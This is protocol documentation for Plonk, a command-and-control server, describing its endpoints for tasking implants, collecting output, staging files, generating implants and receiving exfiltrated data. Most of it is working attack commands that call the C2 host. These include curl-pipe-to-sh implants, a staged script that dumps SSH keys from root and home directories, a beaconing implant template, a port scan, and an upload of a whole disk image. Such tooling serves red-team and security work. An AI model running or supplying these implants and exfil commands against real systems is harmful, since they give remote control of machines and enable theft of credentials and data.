Protocol
========
Plonk, at it's core, is just an HTTP(s) server with extra steps.  It serves up
five endpoints:

Endpoint                       | Description
-------------------------------|------------
[`/t/<ID>`](#tasking-t)        | Request for tasking
[`/o/<id>`](#output-o)         | Command output
[`/f/<path>`](#static-files-f) | Serves static files
[`/c`](#implant-generation-c)  | "Implant" generation
[`/p/<path>`](#exfil-p)        | Exfil upload

All other HTTP queries get a 200 back with either an empty body or the contents
of `<plonk dir>/index.html` if it exists; its contents need not actually be
HTML.

Plonk is not particular about which HTTP verb is used.  Use whichever is
easiest on the implant side.  Plonk also isn't particular about what HTTP
client or client library an implant uses.  Although `/c` generates cURL in a
loop, anything which speaks Plonk's protocol works.

Implant IDs
-----------
Each Implant is assumed to have its own, unique ID.  This isn't enforced, but
things get kinda weird if it's not the case.  The ID itself doesn't matter much
as long as it works in a URL.

Tasking (`/t`)
------------
Plonk maintains a per-Implant ID task queue.  A task is retrieved by making a
request for `/t/<ID>`.  Tasks are queued in the client by selecting an implant
with `,seti` and then giving the task as a command, or, alternatively, with
`,task`.

Tasking sent to the implant will have a newline appended.

### Example
#### Client:
```
(plonk)> ,seti kittens
2023/12/30 00:29:05 Interacting with kittens
2023/12/30 00:29:05 Use ,logs to return to watching Plonk's logs
kittens> ps awwwfux
2023/12/30 00:29:09 [TASKQ] Task queued by stuart for kittens (qlen 1)
ps awwwfux
```

#### Implant:
```sh
curl -s https://example.com/t/kittens | sh  # Runs ps awwwfux
```

Output (`/o`)
-------------
Output is sent back as the body of a request to `/o/<ID>` which may either be a
short request with one chunk of output or a long-lived requst to stream output.
Output is logged and printed to any user which has that ID selected with
`,seti`.  By default, only 1MB of output will be accepted.  Larger amounts of
data may be sent via [`/p`](#exfil-p).

It's not necessary to have a [`/c`-generated](#implant-generation-c) implant
running.  Anything may be sent to `/o` with any ID, using Plonk as a sort of
generic logger.  Don't forget to `,seti <ID>` before sending output to see it
in real-time.  It will still be logged, `,seti` or not, of course.

### Examples
Grab some tasking, using the ID `kittens`.

#### Implant:
```sh
curl -s https://example.com/t/kittens | 
sh 2>&2 | # We'll assume this is ps awwwfux from the previous section
curl --data-binary @- https://example.com/o/kittens
```
#### Client:
```
2023/12/30 00:29:11 [CALLBACK] Sent task to kittens (qlen 0):
ps awwwfux
2023/12/30 00:29:11 [OUTPUT] From kittens
USER       PID %CPU %MEM   VSZ   RSS TT  STAT   STARTED       TIME COMMAND
root         1  0.0  0.0   948   104 ??  I      Sat01AM    0:01.01 /sbin/init
root     30130  0.0  0.0  1112    24 ??  Ip     Sat01AM    0:00.00 - /sbin/slaacd
_slaacd  83001  0.0  0.0  1108    24 ??  Ip     Sat01AM    0:00.00 |-- slaacd: engine (slaacd)
_slaacd  55365  0.0  0.0  1128    24 ??  IpU    Sat01AM    0:00.00 `-- slaacd: frontend (slaacd)
...
```

#### On Target:
Send cheesy portscanner output to Plonk using OpenBSD's
[`nc(1)`](https://man.openbsd.org/nc.1) as open ports are found:
```sh
nc -zw1 100.100.100.2 1-65535 2>&1 | curl -T. http://127.0.0.1:8080/o/portscan
```

#### Client:
```
(plonk)> ,seti portscan
2024/01/17 20:41:26 Interacting with portscan
2024/01/17 20:41:26 Use ,logs to return to watching Plonk's logs
2024/01/17 20:41:50 [OUTPUT] From portscan
Connection to 100.100.100.2 21 port [tcp/ftp] succeeded!
2024/01/17 20:41:50 [OUTPUT] From portscan
Connection to 100.100.100.2 22 port [tcp/ssh] succeeded!
2024/01/17 20:41:50 [OUTPUT] From portscan
Connection to 100.100.100.2 23 port [tcp/telnet] succeeded!
```

This is logged as
```json
{"time":"2024-01-17T20:43:03.210942091+01:00","level":"INFO","msg":"Output",
 "output":"Connection to 100.100.100.2 21 port [tcp/ftp] succeeded!",
 "id":"portscan","host":"127.0.0.1:8080","method":"POST",
 "remote_address":"127.0.0.1:47501","url":"/o/portscan"}
{"time":"2024-01-17T20:43:03.233814119+01:00","level":"INFO","msg":"Output",
 "output":"Connection to 100.100.100.2 22 port [tcp/ssh] succeeded!",
 "id":"portscan","host":"127.0.0.1:8080","method":"POST",
 "remote_address":"127.0.0.1:27598","url":"/o/portscan"}
{"time":"2024-01-17T20:43:03.257795851+01:00","level":"INFO","msg":"Output",
 "output":"Connection to 100.100.100.2 23 port [tcp/telnet] succeeded!",
 "id":"portscan","host":"127.0.0.1:8080","method":"POST",
 "remote_address":"127.0.0.1:12273","url":"/o/portscan"}
```
which is probably a bit easier to read with 
[`jq`](https://jqlang.github.io/jq/):
```
$ tail -f log.json |
  jq -r 'select("Output" == .msg and "portscan" == .id) | .output'
Connection to 100.100.100.2 21 port [tcp/ftp] succeeded!
Connection to 100.100.100.2 22 port [tcp/ssh] succeeded!
Connection to 100.100.100.2 23 port [tcp/telnet] succeeded!
Connection to 100.100.100.2 21 port [tcp/ftp] succeeded!
Connection to 100.100.100.2 22 port [tcp/ssh] succeeded!
Connection to 100.100.100.2 23 port [tcp/telnet] succeeded!
```

Static Files (`/f`)
------------------
Plonk serves static files from `<plonk dir>/files` to requests for `/f/<path>`,
where the path is a path under `<plonk dir>/files`.  This is handy for staging
other tools.

### Example
We'll write a script to save us our first few minutes' worth of typing, then
run it on target.
#### Server:
```sh
cat >~/plonk.d/files/a.sh <<_eof
ps awwwfux
uname -a
id
find /{root,home/*}/.ssh -type f -exec echo {} \; -exec cat {} \;
_eof
```
#### Target:
```sh
curl -s https://example.com/f/a.sh |
sh 2>&1 |  # Script is executed and output sent back
curl --data-binary @- https://example.com/o/kittens
```

Implant Generation (`/c`)
-------------------------
An implant (in the loosest sense of the word) will be generated and returned
to a query to `/c`.  It takes no parameters.  

### Example
#### Target:
```sh
curl https://example.com/c | sh  # A callback should follow in short order
```

### Implant Templates
By default, a little self-backgrounding cURL-in-a-loop script is generated, but
this can be changed by putting a template using Go's
[template syntax](https://pkg.go.dev/text/template) in
`<plonk dir>/implant.tmpl`.  The template will be re-read every time `/c` is
called; no need to restart the server.  It will be passed the following struct
(from [`curlgen.go`](../internal/server/implantsvr/curlgen.go)):
```go
type TemplateParams struct {
	PubkeyFP string `json:",omitempty"` /* Self-signed TLS fingerprint. */
	RandN    string /* Random base36 number, for ImplantID */
	URL      string /* C2 URL for /{t,o}/ImplantID */
}
```
If there is no `implant.tmpl`, the built-in
[`curlgen.tmpl`](../internal/server/implantsvr/curlgen.tmpl) is used.

#### Example
This template runs a few commands for situational awareness then beacons back
to Plonk every two seconds for an hour.  It uses a single, persistent output
connection.
```sh
export PLONK_ID="{{ .RandN }}-$(hostname)-$$"
(
        echo 'ps awwwfux || ps auxwww; uname -a; id; pwd'
        curl -s --rate 30/m "{{ .URL }}/t/$PLONK_ID?n=[0-1800]"
) /bin/sh 2>&1 | curl -sT. "{{ .URL }}/o/$PLONK_ID"
```

Exfil (`/p`)
------------
Data too large to be sent with `/o` or which should be stored in a file may
be sent to `/p`.

The maximum size of efxil which will be saved defaults to 100MB but may be set
using the `-exfil-max` flag when starting the server.  Exfil handling may be
disabled altogether with `-exfil-max 0`.

The first element of the path after `/p` is assumed to be an Implant ID, though
in practice this isn't strictly necessary.  Using an Implant ID has the nice
effect of showing it if that ID has been selected with `,seti`.

### Example
#### Target:
Send back a largeish file from implant `kittens`.
```sh
# This is a pretty terrible idea, unless the target has a really tiny disk.
curl -sT /dev/sda https://example.com/p/kittens/dev/sda
# Neat party trick, though.
```

#### Client:
It's made it back.
```
2024/01/20 00:40:19 [EXFIL] Wrote 26214400 bytes from 127.0.0.1:38644 to
/home/h4x0r/plonk.d/exfil/kittens/dev/sda
```

#### Server:
Make use of the exfil'd file.
```sh
doas vnconfig vnd0 ~/plonk.d/exfil/kittens/dev/sda
doas mount /dev/vnd0i /mnt
```
